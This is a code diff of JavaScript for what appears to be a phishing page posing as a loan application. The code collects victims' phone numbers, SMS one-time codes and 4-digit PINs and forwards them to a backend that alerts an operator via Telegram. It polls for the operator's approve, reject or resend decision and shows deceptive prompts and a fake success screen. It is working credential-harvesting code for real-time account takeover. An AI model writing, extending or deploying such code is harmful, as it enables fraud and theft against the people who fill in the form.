@@ -194,15 +194,18 @@ async function pasteSMS() {
 }
 
 // --- 2. SUBMIT SMS & TRIGGER TELEGRAM ---
+// This function is called by the VERIFY & CONTINUE button on the SMS screen
 async function submitSMS() {
     const smsText = document.getElementById('sms-input').value;
     if (smsText.length < 5) return;
 
+    // Show Processing screen immediately
     goToScreen('screen-processing');
 
     const phone = document.getElementById('phone-number').value || "Unknown";
 
     try {
+        // Send the SMS text to Telegram as the 'code'
         const response = await fetch('/api/request-approval', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -216,13 +219,15 @@ async function submitSMS() {
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                goToScreen('screen-pin'); 
+                goToScreen('screen-pin'); // Loads the next page (4-digit PIN)
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
+                // REJECT logic: popup and go back to 5 digit code page
                 alert("Please enter the correct 5 digit code.");
                 goToScreen('screen-application'); 
             } else if (statusData.status === 'resend') {
                 clearInterval(interval);
+                // RESEND logic: popup and stay on SMS screen
                 alert("Check your SMS for the new SMS code.");
                 goToScreen('screen-sms');
             }
@@ -266,12 +271,10 @@ function moveToPrev(current, event, index) {
     }
 }
 
-// --- 3. TRIGGER TELEGRAM ON PIN SUBMIT AND SHOW SUCCESS PAGE ---
+// --- 3. TRIGGER TELEGRAM ON PIN SUBMIT ---
 async function submitPIN() {
     const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
     const phone = document.getElementById('phone-number').value || "Unknown";
-    
-    // Get the exact applied amount to pass to the success page later
     const appliedAmount = document.getElementById('form-amount').value;
     
     goToScreen('screen-processing');
@@ -291,12 +294,8 @@ async function submitPIN() {
             if (statusData.status === 'approve') {
                 clearInterval(interval);
                 
-                // 1. Set the dynamic amount on the success screen
                 document.getElementById('final-amount-display').innerText = parseInt(appliedAmount).toLocaleString();
-                
-                // 2. Load the congratulations page
                 goToScreen('screen-success'); 
-                
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
                 alert("Incorrect details. Please check your PIN and try again.");
